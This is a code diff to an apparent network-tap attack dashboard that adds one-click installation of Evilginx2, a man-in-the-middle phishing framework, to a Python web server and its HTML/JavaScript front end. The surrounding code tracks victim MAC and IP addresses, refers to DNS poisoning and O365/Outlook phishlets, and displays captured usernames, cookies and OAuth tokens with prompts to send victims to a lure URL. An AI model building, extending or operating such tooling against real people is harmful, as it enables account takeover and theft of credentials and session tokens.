@@ -805,6 +805,7 @@ lures get-url 0
         return {
             'running': self.running,
             'installed': self.check_installation(),
+            'install_path': self.evilginx_path if self.check_installation() else None,
             'phishlet': self.phishlet,
             'lure_url': self.lure_url,
             'bridge_ip': self.bridge_ip,
@@ -812,6 +813,53 @@ lures get-url 0
             'sessions': self.sessions,
             'pid': self.process.pid if self.process and self.process.poll() is None else None
         }
+    
+    def install(self):
+        """Install Evilginx2 using the install script"""
+        try:
+            log("Starting Evilginx2 installation...")
+            
+            # Find the install script
+            script_locations = [
+                '/opt/nac-tap/install-evilginx.sh',
+                os.path.join(os.path.dirname(os.path.abspath(__file__)), 'install-evilginx.sh'),
+                '/tmp/install-evilginx.sh'
+            ]
+            
+            install_script = None
+            for location in script_locations:
+                if os.path.exists(location):
+                    install_script = location
+                    break
+            
+            if not install_script:
+                log("Install script not found", 'ERROR')
+                return {'success': False, 'error': 'Install script not found'}
+            
+            # Run installation script
+            result = run_cmd(['bash', install_script], timeout=600)
+            
+            if result and result.returncode == 0:
+                log("Evilginx2 installation completed successfully", 'SUCCESS')
+                return {
+                    'success': True,
+                    'message': 'Evilginx2 installed successfully',
+                    'path': self.evilginx_path
+                }
+            else:
+                error_msg = result.stderr if result else "Unknown error"
+                log(f"Installation failed: {error_msg}", 'ERROR')
+                return {
+                    'success': False,
+                    'error': f'Installation failed: {error_msg}'
+                }
+                
+        except Exception as e:
+            log(f"Installation error: {e}", 'ERROR')
+            return {
+                'success': False,
+                'error': str(e)
+            }
 
     def clear_sessions(self):
         """Clear all captured sessions"""
@@ -1504,6 +1552,15 @@ class NACWebHandler(BaseHTTPRequestHandler):
             self.bridge_manager.evilginx_manager.clear_sessions()
             self._send_json({'success': True})
             
+        elif path == '/api/evilginx/install':
+            try:
+                log("Received Evilginx installation request")
+                result = self.bridge_manager.evilginx_manager.install()
+                self._send_json(result)
+            except Exception as e:
+                log(f"Installation endpoint error: {e}", 'ERROR')
+                self._send_json({'success': False, 'error': str(e)})
+            
         else:
             self.send_error(404)
 
@@ -1758,6 +1815,13 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <p><strong>Setup:</strong> DNS must point victim to this device, or use local DNS poisoning.</p>
 </div>
 
+<div id="evilginxNotInstalled" style="display:none;background:#ffe7e7;padding:20px;border-radius:8px;margin:15px 0;border-left:4px solid #e74c3c">
+<h3 style="color:#e74c3c;margin-bottom:15px">⚠️ Evilginx2 Not Installed</h3>
+<p style="margin-bottom:15px">Evilginx2 is required for OAuth token and cookie capture.</p>
+<button class="btn btn-start" onclick="installEvilginx()" style="margin-top:10px">📥 Install Evilginx2 Now</button>
+<p style="margin-top:15px;font-size:.9em;color:#999">Installation takes 5-10 minutes (includes Go compiler build)</p>
+</div>
+
 <div id="evilginxInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
 <h3 style="color:#0066cc;margin-bottom:15px">📡 Active Phishing</h3>
 <p style="margin:8px 0"><strong>Phishlet:</strong> <code id="evilginxPhishlet" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
@@ -1829,7 +1893,7 @@ function showAlert(message,type="info"){const el=document.getElementById("alert"
 function formatBytes(bytes){if(bytes===0)return"0 B";const k=1024,sizes=["B","KB","MB","GB"];const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}
 function formatDuration(seconds){const h=Math.floor(seconds/3600);const m=Math.floor(seconds%3600/60);const s=Math.floor(seconds%60);return`${h.toString().padStart(2,"0")}:${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`}
 function switchTab(tab){document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));document.getElementById(tab+"Tab").classList.add("active");event.target.classList.add("active");if(tab==="loot")fetchLoot();if(tab==="mitm")fetchStatus()}
-function updateStatus(data){try{const isActive=data.status==="active";const badge=document.getElementById("statusBadge");if(badge){badge.className=`status-badge ${isActive?"active":"inactive"}`;badge.innerHTML=`<span class="status-indicator ${isActive?"active":"inactive"}"></span><span>${isActive?"Active":"Inactive"}</span>`}const captureInfo=document.getElementById("captureInfo");if(captureInfo){captureInfo.className=`capture-info ${isActive?"active":""}`}const size=data.pcap_size||0;const packets=data.packet_count||0;const pcapSizeBtn=document.getElementById("btnPcapSize");if(pcapSizeBtn){pcapSizeBtn.textContent=`📊 PCAP Size: ${formatBytes(size)}`;pcapSizeBtn.disabled=!data.pcap_file}if(data.mitm){const mitmBadge=document.getElementById("mitmBadge");if(mitmBadge){const enabled=data.mitm.enabled;mitmBadge.className=`status-badge ${enabled?"active":"inactive"}`;mitmBadge.innerHTML=`<span class="status-indicator ${enabled?"active":"inactive"}"></span><span>${enabled?"Active":"Inactive"}</span>`}const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;const btnDisableMITM=document.getElementById("btnDisableMITM");if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;if(data.mitm.victim_mac){const victimInfo=document.getElementById("victimInfo");if(victimInfo)victimInfo.style.display="block";const victimMac=document.getElementById("victimMac");if(victimMac)victimMac.textContent=data.mitm.victim_mac;const victimIP=document.getElementById("victimIP");if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";const gatewayMac=document.getElementById("gatewayMac");if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown"}else{const victimInfo=document.getElementById("victimInfo");if(victimInfo)victimInfo.style.display="none"}const rulesDiv=document.getElementById("activeRules");if(rulesDiv){if(data.mitm.active_rules&&data.mitm.active_rules.length>0){rulesDiv.innerHTML=data.mitm.active_rules.map(rule=>`<div class="rule-item"><div class="rule-info"><strong>${rule.protocol}</strong> port ${rule.port} → ${rule.target_ip} (${rule.destination})</div></div>`).join("")}else{rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>'}}}if(isActive){const captureFile=document.getElementById("captureFile");if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";const capturePid=document.getElementById("capturePid");if(capturePid)capturePid.textContent=data.pid||"-";const bridgeName=document.getElementById("bridgeName");if(bridgeName)bridgeName.textContent=data.bridge||"br0";const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=formatBytes(size);const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";if(data.start_time){if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}const elapsed=Math.floor((new Date()-startTime)/1000);const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent=formatDuration(elapsed)}const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=true;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=false;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=true;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=false}else{const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=false;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=true;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=!data.pcap_file;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=!data.pcap_file;startTime=null;const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent="0 packets";const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent="00:00:00"}if(data.interfaces){const container=document.getElementById("interfaces");if(container){container.innerHTML=data.interfaces.map(intf=>`<div class="interface-card"><div class="interface-header"><span class="interface-name">${intf.name}</span><span class="interface-status ${intf.state==="UP"?"up":"down"}">${intf.state}</span></div><div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">${intf.mac||"N/A"}</span></div><div class="interface-detail"><span>Role:</span><span>${intf.role||"N/A"}</span></div></div>`).join("")}}if(data.logs&&data.logs.length>0){const logEl=document.getElementById("logs");if(logEl){logEl.innerHTML=data.logs.map(line=>`<div style="padding:2px 0">${line}</div>`).join("");logEl.scrollTop=logEl.scrollHeight}}}catch(err){console.error("Error updating status:",err)}}
+function updateStatus(data){try{const isActive=data.status==="active";const badge=document.getElementById("statusBadge");if(badge){badge.className=`status-badge ${isActive?"active":"inactive"}`;badge.innerHTML=`<span class="status-indicator ${isActive?"active":"inactive"}"></span><span>${isActive?"Active":"Inactive"}</span>`}const captureInfo=document.getElementById("captureInfo");if(captureInfo){captureInfo.className=`capture-info ${isActive?"active":""}`}const size=data.pcap_size||0;const packets=data.packet_count||0;const pcapSizeBtn=document.getElementById("btnPcapSize");if(pcapSizeBtn){pcapSizeBtn.textContent=`📊 PCAP Size: ${formatBytes(size)}`;pcapSizeBtn.disabled=!data.pcap_file}if(data.mitm){const mitmBadge=document.getElementById("mitmBadge");if(mitmBadge){const enabled=data.mitm.enabled;mitmBadge.className=`status-badge ${enabled?"active":"inactive"}`;mitmBadge.innerHTML=`<span class="status-indicator ${enabled?"active":"inactive"}"></span><span>${enabled?"Active":"Inactive"}</span>`}const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;const btnDisableMITM=document.getElementById("btnDisableMITM");if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;if(data.mitm.victim_mac){const victimInfo=document.getElementById("victimInfo");if(victimInfo)victimInfo.style.display="block";const victimMac=document.getElementById("victimMac");if(victimMac)victimMac.textContent=data.mitm.victim_mac;const victimIP=document.getElementById("victimIP");if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";const gatewayMac=document.getElementById("gatewayMac");if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown"}else{const victimInfo=document.getElementById("victimInfo");if(victimInfo)victimInfo.style.display="none"}const rulesDiv=document.getElementById("activeRules");if(rulesDiv){if(data.mitm.active_rules&&data.mitm.active_rules.length>0){rulesDiv.innerHTML=data.mitm.active_rules.map(rule=>`<div class="rule-item"><div class="rule-info"><strong>${rule.protocol}</strong> port ${rule.port} → ${rule.target_ip} (${rule.destination})</div></div>`).join("")}else{rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>'}}}if(data.evilginx){const evilBadge=document.getElementById("evilginxBadge");const evilBadge2=document.getElementById("evilginxBadge2");const running=data.evilginx.running;const installed=data.evilginx.installed;const sessCount=data.evilginx.sessions_count||0;if(evilBadge)evilBadge.textContent=sessCount;if(evilBadge2){evilBadge2.className=`status-badge ${running?"active":"inactive"}`;evilBadge2.innerHTML=`<span class="status-indicator ${running?"active":"inactive"}"></span><span>${running?"Running":"Inactive"}</span>`}const statusCard=document.getElementById("evilginxStatusCard");const installStatusEl=document.getElementById("evilginxInstallStatus");const pathEl=document.getElementById("evilginxPath");const btnInstall=document.getElementById("btnInstallEvilginx");if(statusCard){if(installed){statusCard.style.borderLeftColor="#27ae60";if(installStatusEl)installStatusEl.innerHTML='<span style="color:#27ae60">✓ Installed</span>';if(pathEl)pathEl.textContent=data.evilginx.install_path||'/opt/evilginx2/evilginx';if(btnInstall)btnInstall.style.display="none"}else{statusCard.style.borderLeftColor="#e74c3c";if(installStatusEl)installStatusEl.innerHTML='<span style="color:#e74c3c">✗ Not Installed</span>';if(pathEl)pathEl.textContent="Click below to install";if(btnInstall)btnInstall.style.display="block"}}const btnStartO365=document.getElementById("btnStartO365");const btnStartOutlook=document.getElementById("btnStartOutlook");const btnStopEvil=document.getElementById("btnStopEvilginx");const evilNotInstalled=document.getElementById("evilginxNotInstalled");const evilInfo=document.getElementById("evilginxInfo");if(!installed){if(btnStartO365)btnStartO365.disabled=true;if(btnStartOutlook)btnStartOutlook.disabled=true;if(btnStopEvil)btnStopEvil.disabled=true;if(evilNotInstalled)evilNotInstalled.style.display="block";if(evilInfo)evilInfo.style.display="none"}else{if(btnStartO365)btnStartO365.disabled=running;if(btnStartOutlook)btnStartOutlook.disabled=running;if(btnStopEvil)btnStopEvil.disabled=!running;if(evilNotInstalled)evilNotInstalled.style.display="none";if(evilInfo){if(running&&data.evilginx.lure_url){evilInfo.style.display="block";const phishEl=document.getElementById("evilginxPhishlet");const lureEl=document.getElementById("evilginxLure");if(phishEl)phishEl.textContent=data.evilginx.phishlet||"Unknown";if(lureEl)lureEl.textContent=data.evilginx.lure_url||"Unknown"}else{evilInfo.style.display="none"}}}const sessDiv=document.getElementById("evilginxSessions");if(sessDiv){if(data.evilginx.sessions&&data.evilginx.sessions.length>0){sessDiv.innerHTML=data.evilginx.sessions.map((s,i)=>`<div style="background:#fff;margin:10px 0;padding:15px;border-radius:8px;border-left:4px solid #28a745"><div style="display:flex;justify-content:space-between;margin-bottom:10px"><strong style="color:#28a745">Session #${i+1}</strong><span style="color:#999;font-size:.85em">${new Date(s.timestamp).toLocaleString()}</span></div><div style="margin:8px 0;font-size:.95em"><strong>Username:</strong> <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px">${s.username||'N/A'}</code></div><div style="margin:8px 0;font-size:.95em"><strong>Phishlet:</strong> ${s.phishlet||'N/A'}</div><details style="margin-top:10px"><summary style="cursor:pointer;color:#0066cc">Show Cookies & Tokens</summary><pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">${escapeHtml(s.cookies||'No cookies')}</pre><pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">${escapeHtml(s.tokens||'No tokens')}</pre></details></div>`).join("")}else if(running){sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">⏳</div><p>Waiting for victims...</p><p style="margin-top:10px;font-size:.9em">Share lure URL with targets</p></div>'}else{sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">🍪</div><p>No sessions captured yet</p><p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p></div>'}}}if(isActive){const captureFile=document.getElementById("captureFile");if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";const capturePid=document.getElementById("capturePid");if(capturePid)capturePid.textContent=data.pid||"-";const bridgeName=document.getElementById("bridgeName");if(bridgeName)bridgeName.textContent=data.bridge||"br0";const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=formatBytes(size);const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";if(data.start_time){if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}const elapsed=Math.floor((new Date()-startTime)/1000);const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent=formatDuration(elapsed)}const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=true;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=false;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=true;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=false}else{const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=false;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=true;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=!data.pcap_file;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=!data.pcap_file;startTime=null;const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent="0 packets";const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent="00:00:00"}if(data.interfaces){const container=document.getElementById("interfaces");if(container){container.innerHTML=data.interfaces.map(intf=>`<div class="interface-card"><div class="interface-header"><span class="interface-name">${intf.name}</span><span class="interface-status ${intf.state==="UP"?"up":"down"}">${intf.state}</span></div><div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">${intf.mac||"N/A"}</span></div><div class="interface-detail"><span>Role:</span><span>${intf.role||"N/A"}</span></div></div>`).join("")}}if(data.logs&&data.logs.length>0){const logEl=document.getElementById("logs");if(logEl){logEl.innerHTML=data.logs.map(line=>`<div style="padding:2px 0">${line}</div>`).join("");logEl.scrollTop=logEl.scrollHeight}}}catch(err){console.error("Error updating status:",err)}}
 async function analyzeNow(){const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{const res=await fetch("/api/analyze",{method:"POST"});const data=await res.json();if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
 async function deletePCAP(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{const res=await fetch("/api/delete_pcap",{method:"POST"});const data=await res.json();if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
 document.getElementById("btnDelete").addEventListener("click",deletePCAP);
@@ -1853,6 +1917,36 @@ async function stopEvilginx(){if(!confirm("Stop Evilginx? Captured sessions will
 async function clearSessions(){if(!confirm("Clear all captured sessions?"))return;try{const res=await fetch("/api/evilginx/clear_sessions",{method:"POST"});if(res.ok){showAlert("Sessions cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
 
 function exportSessions(){window.location.href="/api/evilginx/sessions"}
+
+async function installEvilginx(){
+if(!confirm("Install Evilginx2?\n\nThis will:\n- Install Go compiler\n- Clone Evilginx2 repository\n- Build from source\n- Configure permissions\n\nThis may take 5-10 minutes."))return;
+const btn=document.getElementById("btnInstallEvilginx");
+if(btn){
+btn.disabled=true;
+btn.textContent="⏳ Installing...";
+}
+showAlert("Installing Evilginx2... This may take several minutes. Check logs for progress.","info");
+try{
+const res=await fetch("/api/evilginx/install",{method:"POST"});
+const data=await res.json();
+if(data.success){
+showAlert(`✓ Evilginx2 installed successfully!\n\nPath: ${data.path}`,"success");
+setTimeout(fetchStatus,2000);
+}else{
+showAlert("Installation failed: "+(data.error||"Unknown error"),"error");
+if(btn){
+btn.disabled=false;
+btn.textContent="📥 Install Evilginx";
+}
+}
+}catch(err){
+showAlert("Installation error: "+err.message,"error");
+if(btn){
+btn.disabled=false;
+btn.textContent="📥 Install Evilginx";
+}
+}
+}
 
 document.getElementById("btnStart").addEventListener("click",startCapture);
 document.getElementById("btnStop").addEventListener("click",stopCapture);
